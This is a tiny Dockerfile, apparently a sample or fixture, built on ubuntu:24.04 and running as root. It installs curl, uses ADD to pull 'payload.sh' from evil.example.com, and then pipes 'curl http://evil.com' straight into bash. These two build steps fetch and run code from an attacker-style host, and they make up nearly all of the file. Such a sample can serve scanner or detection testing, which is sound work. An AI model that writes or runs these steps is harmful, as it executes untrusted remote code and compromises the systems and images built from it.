FROM ubuntu:24.04
USER root
RUN apt-get update && apt-get install -y curl
ADD http://evil.example.com/payload.sh /payload.sh
RUN curl http://evil.com | bash
